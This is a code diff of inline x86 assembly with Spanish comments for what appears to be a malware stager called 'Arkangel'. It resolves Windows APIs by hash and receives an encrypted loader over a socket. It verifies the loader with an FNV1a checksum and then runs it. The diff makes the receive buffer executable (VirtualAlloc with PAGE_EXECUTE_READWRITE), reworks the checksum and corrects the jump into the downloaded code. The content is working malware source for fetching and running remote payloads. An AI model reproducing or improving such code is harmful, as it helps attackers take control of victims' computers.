@@ -48,7 +48,7 @@ kernel32_symbol_hashes:
         API_DEFINE(GetProcAddress, ('G') ('e') ('t') ('P') ('r') ('o') ('c') ('A') ('d') ('d') ('r') ('e') ('s') ('s') )
         API_DEFINE(Sleep, ('S') ('l') ('e') ('e') ('p') )
         API_DEFINE(ExitProcess, ('E') ('x') ('i') ('t') ('P') ('r') ('o') ('c') ('e') ('s') ('s') )
-        API_DEFINE(LocalAlloc, ('L') ('o') ('c') ('a') ('l') ('A') ('l') ('l') ('o') ('c') )
+        API_DEFINE(VirtualAlloc, ('V') ('i') ('r') ('t') ('u') ('a') ('l') ('A') ('l') ('l') ('o') ('c') )
         #ifdef MUTEX
         API_DEFINE(CreateMutexA, ('C') ('r') ('e') ('a') ('t') ('e') ('M') ('u') ('t') ('e') ('x') ('A') )
         #endif
@@ -222,9 +222,12 @@ nomtx:
 
         //Creamos el buffer donde recibiremos toda la información
         #define BUFF_SIZE   0x10000
+        cdq                             //EDX = 0
+        push PAGE_EXECUTE_READWRITE     //v
+        pushc(MEM_COMMIT)               //v
         pushc(BUFF_SIZE)                //v
-        push GPTR                       //v
-        call [ebp+_LocalAlloc]          //>LocalAlloc(GPTR, BUFF_SIZE)
+        push edx                        //v
+        call [ebp+_VirtualAlloc]        //>VirtualAlloc(0, BUFF_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
         #ifdef ERR_CHECK
         push ERR_MEM                    //v
         call gtfo                       //>(EAX!=0)? No ha habido error, tenemos donde guardar los datos
@@ -314,11 +317,11 @@ connected:
         ** Recepción de datos desde el cliente:
         **  Una vez establecida la conexión con éxito intentamos recibir 
         **  el paquete inicial compuesto de:
-        **      IV+SizePayload+offset_basis+LOADER_IAT+CARGADOR
+        **      IV+SizePayload+checksum+LOADER_IAT+CARGADOR
         **  Siendo cada uno:
         **      *IV(16bytes)    : Vector de inicializacion para el cifrado
         **{{
-        **      *offset_basis   : offset_basis de todo el paquete a partir del SizePayload, para evitar error crítico al ejecutar.
+        **      *checksum       : checksum de todo el paquete a partir del SizePayload(inclusive), para evitar error crítico al ejecutar.
         **      *SizePayload    : sizeof(LOADER_IAT+CARGADOR+4)
         **      *LOADER_IAT     : Loader de Arkangel encargado de ubicar y ejecutar el cargador de plugins
         **      *CARGADOR       : Cargador de plugins... encargado de gestionar la conexión
@@ -402,27 +405,25 @@ init_decrypt:
 
         /*###############################################################################
         ** Comprobación del checksum:
-        **    El offset_basis esta en +16 de los datos recibidos.
+        **    El checksum esta en +16 de los datos recibidos.
         **    El algoritmo utilizado para calcular el checksum es: 
         **        *FNV1a (http://goo.gl/1A7ir)
-        **    El offset_basis es un número especialmente calculado para cuando se obtenga
-        **     el checksum de los datos éste sea 0.
         *###############################################################################*/
 
         mov  esi, [ebp+_pBuff]          //ESI = pBuff
-        add  esi, 4                     //ESI+= 4 (saltamos offset_basis)
+        add  esi, 4                     //ESI+= 4 (saltamos checksum)
         mov  ecx, [esi]                 //ECX = SizePayload
         add  ecx, 4
-
-        mov  edx, [esi-4]               //hash = offset_basis
+        mov  ebx, [esi-4]               //EBX = CheckSum
+        cdq                             //hash = 0
 FNV1a:
         lodsb                           //al = str[i]; i++;
         xor  dl, al                     //>hash ^= str[i];
         imul edx, 0x1EF30EB             //>hash *= 0x1EF30EB;
         loop FNV1a                      //>(len--);(len < 0)?
 
-        test edx, edx
-        jnz  KillSocket                 //>(EDX==0?)Si es igual a cero significa que los datos recibidos eran correctos
+        cmp  edx, ebx
+        jne  KillSocket                 //>(EDX==checksum?)Si es igual a cero significa que los datos recibidos eran correctos
 
         //Si el checksum no devuelve 0 algo falla en el checksum... reseteemos la conexión
 
@@ -432,7 +433,7 @@ NoErr4: pushr(KEY)                      //v
         push [ebp+_GetProcAddress]      //v
         push [ebp+_LoadLibraryA]        //v
         mov  eax, [ebp+_pBuff]          //v
-        add  eax, 0x4                   //v
+        add  eax, 0x8                   // Saltamos hasta el cargador_IAT
         call eax                        //>cargador_IAT(&LoadLibraryA, &GetProcAddress, hSocket, &KEY);*/
     }
 }
